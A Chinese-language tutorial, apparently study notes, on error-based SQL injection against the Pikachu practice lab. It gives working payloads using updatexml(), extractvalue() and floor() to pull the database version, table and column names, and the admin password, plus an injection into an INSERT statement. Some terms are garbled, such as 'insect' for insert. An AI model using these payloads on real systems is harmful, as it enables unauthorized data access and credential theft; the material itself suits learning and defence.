# 报错查询

## 一、原理

sql使用中，一些函数在不符合其使用时会发生报错，如select/insect/update/delete，虽然会报错，但是会先执行后报错，可以据此查看一些信息。

### 二、应用

使用报错函数首先需要程序可以进行报错。

#### 常用报错函数

##### 1.updatexml()

对xml文件进行查询修改的XPATH函数

UPDATEXML (XML_document, XPath_string, new_value);

第一个参数：XML_document是String格式，为[XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020)文档对象的名称

第二个参数：XPath_string ([Xpath](https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020)格式的字符串)

第三个参数：new_value，String格式，替换查找到的符合条件的数据

还是使用字符型注入进行版本查询试验

```
payload:kobe' and updatexml(1,payload《例如version()》,0)#
```

**其中1不存在,但报错信息不全**

**01使用concat()函数进行补全,**

```
payload:kobe' and updatexml(1,concat(0x7e,version()),0)#
```

0x7e对应~

获取表名

```
payload:kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema= 'pikachu')),0)#
```

发现结果提示一行无法显示

**02使用limit函数一次显示一行**

```
payload:kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema= 'pikachu' limit 0,1)),0)#
从0开始取一行，将第一个表打印一行
limit 1,1 /limit 2,1
```

通过表名查询字段/列

```
payload:kobe' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name= 'users' limit 0,1)),0)#
```

通过字段(列)查询数据

```
payload:kobe' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#
```

```
payload:kobe' and updatexml(1,concat(0x7e,(select password from users where username='admin' limit 0,1)),0)#
```

#### 2.extractvalue()

对XML文件进行查询的XPATH函数

语法：extractvalue(目标xml文档，xml路径)

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，第二个参数可以添加payload

```
kobe' and extractvalue(1,payload)#
```

```
payload:kobe' and extractvalue(1,concat(0x7e,version()))#
```

具体使用方法与updatexml类似

##### 3.floor()

用来取整的函数

```
payload：kobe' and (select 2 from (select count(*),concat(payload,floor(rand(0)*2))x from information_schema.tables group by x)a)#


payload:kobe' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
```

#### 数据库操作函数

##### 4.insect()插入函数

在数据库新增数据时，insect一般使用or进行闭合

```
sql语句:insect into member(usernmae,pw,sex,phonenum,email,address) values('1 'or payload or'','2','3','4','5','6')
```

原理

```
insect into member(usernmae,pw,sex,phonenum,email,address) values('1' or updatexml(1,concat(0x7e,database()),0) or '','2','3','4','5','6')
```

```
payload:1' or updatexml(1,concat(0x7e,database()),0) or '
```

##### 5.update()上传函数

在修改数据时使用，一般和inset类似

##### 6.delete（）删除函数

需要改包，并且进行url编码
